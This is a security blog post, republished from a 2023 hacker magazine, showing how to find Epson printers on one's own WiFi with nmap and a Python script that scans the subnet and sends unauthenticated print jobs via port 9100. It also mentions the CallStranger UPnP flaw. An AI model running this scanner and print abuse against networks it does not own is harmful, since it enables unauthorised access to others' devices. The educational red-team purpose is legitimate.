---
title:  "HVCK magazine - issue 1: How to \"hack\" your Epson printer"
date:   2025-12-02 03:00:00 +0200
header:
  teaser: "/assets/images/185/photo_2023-01-03_22-37-06.jpg"
categories:
  - IoT
tags:
  - red team
  - linux
  - IoT
  - epson
  - printer
---

﷽

This article was written by me for a hacker's [HVCK magazine: Issue 1](https://github.com/HVCK-Magazine/back-issues/raw/main/HVCK-Issue-1-2023-1.pdf) in 2023.    

Therefore, the [PoC](https://github.com/cocomelonc/meow/blob/master/hvck/2023-01-01-rf-wifi/hack.py) is relevant and works properly at the time of writing in January 2023.     

![epson](/assets/images/185/2025-12-02_10-41.png){:class="img-responsive"}    

In this article, I want to show you how it is not safe to leave devices accessible from a WiFi network. In my case, I will be using my new epson printer for experiments that I bought for the new year:      

![epson](/assets/images/185/photo_2023-01-03_22-37-06.jpg){:class="img-responsive"}         

At the end of the article, we will write a simple epson printer's scanner on your network, and if it is available, we will send something to print.    

First of all, scan your wireless network via `nmap` for hosts discovery:   

```bash
nmap -sn -T4 192.168.1.0/24 -oG | awk '/Up$/{print $2}'
```

![scan](/assets/images/185/2023-01-01_21-33.png){:class="img-responsive"}        

In my case I already know what my printer is `192.168.1.50`. Scan it for open tcp ports:    

```bash
nmap -Pn -T4 -A 192.168.1.50
```

![nmap epson](/assets/images/185/2023-01-01_20-42.png){:class="img-responsive"}         

As you can see, some ports are open. Via [this](https://epson.com/faq/SPT_C11CD16201~faq-0000525-shared), we can find out that `631` - for IPP/IPPS printing, `9100` - for network printing, `515` - forwarding LPR data.     

For simplicity, let's say that if `443` port banner contains `EPSON` - it's EPSON printer:    

![epson 80](/assets/images/185/2023-01-01_20-57.png){:class="img-responsive"}         

```python
### tcp scan 443 port
def check_ip(addr):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(3)
    try:
        res = s.connect((addr, 443))
        s = ssl.wrap_socket(s, keyfile = None, 
                            certfile = None, 
                            server_side = False, 
                            cert_reqs = ssl.CERT_NONE, 
                            ssl_version = ssl.PROTOCOL_SSLv23)
        s.sendall(b"GET / HTTP/1.1\r\nHost: " + addr.encode() + b"\r\nConnection: close\r\n\r\n")
        banner = s.recv(4096).decode()
        if "EPSON" in banner:
            print (Colors.GREEN + f"found epson printer: {addr} " + Colors.ENDC)
            return True
    except:
        return False

```

If we scan `192.168.1.50` again for all TCP ports:    

```bash
nmap -Pn -T4 -A -p- 192.168.1.50
```

![nmap all ports](/assets/images/185/2023-01-01_21-20.png){:class="img-responsive"}        

we found that, `1865` is also open -  Forwarding scan data from Document Capture Pro and Document Capture.    

### CVE-12695: CallStranger

Also you can see, another interesting thing:    

![callstranger](/assets/images/185/2023-01-08_01-06.png){:class="img-responsive"}        

A critical vulnerability has been discovered in the *UPnP (Universal Plug and Play)* protocol that directly affects most Internet of Things (IoT) devices.

This vulnerability named CallStranger and numbered `CVE-2020-12695` was discovered and privately reported in late 2019 to the Open Connectivity Foundation (#OCF) by the security researcher named [Yunus Çadırcı](https://github.com/yunuscadirci/)

### practical example

First of all, add function which check our IP address in Wireless network:    

```python
### get my wlan IP address
def my_ip(iface):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    iface = struct.pack('256s', iface.encode('utf_8'))
    addr = fcntl.ioctl(s.fileno(), 0x8915, iface)[20:24]
    return socket.inet_ntoa(addr)
```

Also add function which scan all our network for searching printers, if found "hack" them:    

```python
### scan subnet for epson printers
def scan_net():
    hosts = []
    subnet = str(my_ip("wlan0"))
    print (Colors.BLUE + "subnet: " + subnet + "/24..." + Colors.ENDC)
    subnet = ".".join(subnet.split(".")[:-1])

    for i in range(0, 255):
        ip = subnet + "." + str(i)
        hosts.append(ip)

    with ProcessPoolExecutor(len(hosts)) as executor:
        results = executor.map(check_ip, hosts)
        for host, is_printer in zip(hosts, results):
            if is_printer:
                hack(host)
```

For simplicity just for experiment, we just print something via `9100` port. As I wrote earlier this port is used for network printers.    

```python
from escpos.printer import Network

#....

### print via 9100 port
def hack(host):
    print (Colors.YELLOW + "try to hack printer... " + str(host) + Colors.ENDC)
    printer = Network(host) #Printer IP Address
    printer.text("Hacked, meow-meow =^..^=\n")
    printer.cut()
    print (Colors.GREEN + "printer successfully hacked :)" + Colors.ENDC)
```

As you can see, we just import [https://github.com/python-escpos/python-escpos](https://github.com/python-escpos/python-escpos) library for printing.    

So the full source code of our script is something like this (`hack.py`):    

```python
import ssl
import socket
import fcntl
import struct
from concurrent.futures import ProcessPoolExecutor
from escpos.printer import Network
import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning) 

### for terminal colors
class Colors:
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    PURPLE = '\033[95m'
    ENDC = '\033[0m'

### tcp scan 443 port
def check_ip(addr):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(3)
    try:
        res = s.connect((addr, 443))
        s = ssl.wrap_socket(s, keyfile = None, 
                            certfile = None, 
                            server_side = False, 
                            cert_reqs = ssl.CERT_NONE, 
                            ssl_version = ssl.PROTOCOL_SSLv23)
        s.sendall(b"GET / HTTP/1.1\r\nHost: " + addr.encode() + b"\r\nConnection: close\r\n\r\n")
        banner = s.recv(4096).decode()
        if "EPSON_Linux UPnP/1.0" in banner:
            print (Colors.GREEN + f"found epson printer: {addr} " + Colors.ENDC)
            return True
    except:
        return False

### print via 9100 port
def hack(host):
    print (Colors.YELLOW + "try to hack printer... " + str(host) + Colors.ENDC)
    printer = Network(host) #Printer IP Address
    printer.text("Hacked, meow-meow =^..^=\n")
    printer.cut()
    print (Colors.GREEN + "printer successfully hacked :)" + Colors.ENDC)

### get my wlan IP address
def my_ip(iface):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    iface = struct.pack('256s', iface.encode('utf_8'))
    addr = fcntl.ioctl(s.fileno(), 0x8915, iface)[20:24]
    return socket.inet_ntoa(addr)

### scan subnet for epson printers
def scan_net():
    hosts = []
    subnet = str(my_ip("wlan0"))
    print (Colors.BLUE + "subnet: " + subnet + "/24..." + Colors.ENDC)
    subnet = ".".join(subnet.split(".")[:-1])

    for i in range(0, 255):
        ip = subnet + "." + str(i)
        hosts.append(ip)

    with ProcessPoolExecutor(len(hosts)) as executor:
        results = executor.map(check_ip, hosts)
        for host, is_printer in zip(hosts, results):
            if is_printer:
                hack(host)
scan_net()
```

As you can see, we check banner for possible vulnerable version of UPnP.    

For the purity of the experiment, I also checked my printer with the author's [PoC](https://github.com/yunuscadirci/CallStranger) after discover vulnerable version.      

### demo    

Let's go to see everything in action:    

```bash
python3 hack.py
```

![print](/assets/images/185/2023-01-04_15-03.png){:class="img-responsive"}        

![final](/assets/images/185/photo_2023-01-04_15-55-20.jpg){:class="img-responsive"}         

As you can see everything is worked perfectly, our program logic is simple.    

Of course, this is a simple case and simple "dirty" PoC code and only work for you own WIFI network.   

In real life, hackers can detect vulnerable IoT devices that are accessed from the Internet. Also, they use another vulnerabilities in IoT devices and write some kind of working exploit, not only CallStranger. For example, some Epson printers are vulnerable:    

![epsons](/assets/images/185/2023-01-04_16-07.png){:class="img-responsive"}        

[https://www.cvedetails.com/cve/CVE-2020-12695/](https://www.cvedetails.com/cve/CVE-2020-12695/)     

Given that the printer I bought in Istanbul is a new model, it is very strange to find a 2020 vulnerability on it. :)

I hope this post if useful for entry level cybersec specialists and also for professionals.     

[HVCK magazine](https://hvck-magazine.github.io/)    
[HVCK magazine: Issue 1 2023](https://github.com/HVCK-Magazine/back-issues/raw/main/HVCK-Issue-1-2023-1.pdf)     
[PoC: hack.py script](https://github.com/cocomelonc/meow/blob/master/hvck/2023-01-01-rf-wifi/hack.py)     
[CallStranger exploit](https://github.com/yunuscadirci/CallStranger)    

Thanks for your time happy hacking and good bye!   
*PS. All drawings and screenshots are mine*    